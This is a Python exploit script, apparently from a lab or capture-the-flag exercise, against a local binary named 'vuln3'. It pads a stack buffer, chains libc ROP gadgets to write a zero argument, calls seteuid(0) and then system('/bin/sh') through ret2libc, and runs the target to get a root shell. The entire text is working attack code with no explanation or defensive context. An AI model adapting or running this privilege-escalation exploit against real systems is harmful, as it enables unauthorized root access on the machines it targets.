#!/bin/env python
import struct
import subprocess
#All of these gadgets are from libc
#0x00032140: xor eax, eax; ret; 
#0x0001d144: ret;
#0x0002cf59: mov dword ptr [ecx], eax; pop ebx; ret; 
#0x0002a413: pop ecx; ret; 

"""Constants"""
prog = "./vuln3"	
char = "A"
len_to_addr = 264
addr_to_arg1 = 0xbffff21c
"""libc constants"""
libc = 0xb7dd8000
bin_sh = 0xb7f60406
seteuid = libc + 0x000fa250 
system = libc + 0x00044630
exit = libc + 0x000373a0
"""Gadgets"""
xor_eax_eax = libc + 0x00032140
pop_ecx = libc + 0x0002a413
mov_dwordptr_ecx_eax__pop_ebx = libc + 0x0002cf59
ret = libc + 0x0001d144
"""Payload"""
padding = char * len_to_addr
#Libc
bin_sh = struct.pack("I", bin_sh)
seteuid = struct.pack("I", seteuid)
system = struct.pack("I", system)
exit = struct.pack("I", exit)
#gd
xor_eax_eax = struct.pack("I", xor_eax_eax)
pop_ecx = struct.pack("I", pop_ecx)
mov_dwordptr_ecx_eax__pop_ebx = struct.pack("I", mov_dwordptr_ecx_eax__pop_ebx)
ret = struct.pack("I", ret)
addr_to_arg1 = struct.pack("I", addr_to_arg1)
"""ROP CHAIN"""
chain = ret + xor_eax_eax + pop_ecx + addr_to_arg1 + mov_dwordptr_ecx_eax__pop_ebx + "JUNK" 
"""ret2libc chain""" 
chain += seteuid + pop_ecx + "ARG1"
chain += system + exit + bin_sh
"""final payload"""
payload = padding + chain 
"""Execute"""
subprocess.call([prog, payload])

